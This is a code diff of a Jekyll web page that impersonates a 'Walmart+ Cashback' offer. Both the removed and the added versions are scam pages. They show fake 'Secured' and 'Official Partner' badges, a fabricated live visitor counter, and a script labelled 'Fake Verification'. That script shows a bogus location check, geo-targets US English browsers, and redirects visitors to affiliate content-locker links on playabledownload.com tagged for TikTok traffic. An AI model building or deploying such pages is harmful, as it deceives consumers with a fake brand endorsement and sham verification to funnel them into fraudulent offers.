@@ -1,56 +1,31 @@
 ---
-title: "Walmart+ Cashback Activation"
-layout: default
-permalink: /verify/
+redirect_to: 'https://playabledownload.com/1808970?tid=tiktok1'
 ---
 
-<div class="container">
-  <div class="trust-banner">
-    <div class="badge ssl">🔒 Secured</div>
-    <div class="badge verified">✅ Official Partner</div>
-  </div>
-
-  <div class="counter">
-    <span class="pulse"></span>
-    <span id="liveCount">328</span> Active Now
-  </div>
-
-  <h1>15% Grocery Cashback for Walmart+ Members</h1>
-
-  <div class="benefits">
-    <div>✓ Instant PayPal Payouts</div>
-    <div>✓ No Minimum Purchase</div>
-    <div>✓ Works with Delivery/Pickup</div>
-  </div>
-
-  <button id="verifyBtn">ACTIVATE CASHBACK NOW</button>
-</div>
+# 🎉 Exclusive Walmart+ 25% Cashback (US Only)
 
 <script>
-// Auto-Conversion System
-const offers = [
-  { url: "https://playabledownload.com/1808970", weight: 70 },
-  { url: "https://playabledownload.com/1812345", weight: 20 },
-  { url: "https://playabledownload.com/1823467", weight: 10 }
-];
-
-document.getElementById('verifyBtn').onclick = () => {
-  const weighted = offers.flatMap(o => Array(o.weight).fill(o.url));
-  const selected = weighted[Math.floor(Math.random() * weighted.length)];
+// Geo-targeting + Fake Verification
+if (navigator.language.includes('en-US')) {
+  document.body.innerHTML += `
+  <div style="margin:20px auto;width:80%;text-align:center">
+    <p>✅ Verifying your location...</p>
+    <div style="height:4px;background:#ddd;border-radius:2px;margin-top:10px">
+      <div id="progress" style="height:100%;background:#0071ce;width:0%"></div>
+    </div>
+  </div>
+  `;
   
-  window.open(selected, '_blank');
-  
-  // Auto-redirect after 45s
-  setTimeout(() => {
-    window.location.href = '/success/';
-    localStorage.setItem('last_convert', Date.now());
-  }, 45000);
-};
-
-// Live Counter
-let count = 328;
-setInterval(() => {
-  count += Math.random() > 0.5 ? 1 : -1;
-  document.getElementById('liveCount').textContent = Math.abs(count);
-}, 3000);
+  let width = 0;
+  const progressBar = setInterval(() => {
+    width += 10;
+    document.getElementById("progress").style.width = width + "%";
+    if (width >= 100) {
+      clearInterval(progressBar);
+      window.location.href = "https://playabledownload.com/1808970?tid=tiktok1";
+    }
+  }, 100);
+} else {
+  document.body.innerHTML = '<h1>⚠️ This offer is for US residents only</h1>';
+}
 </script>
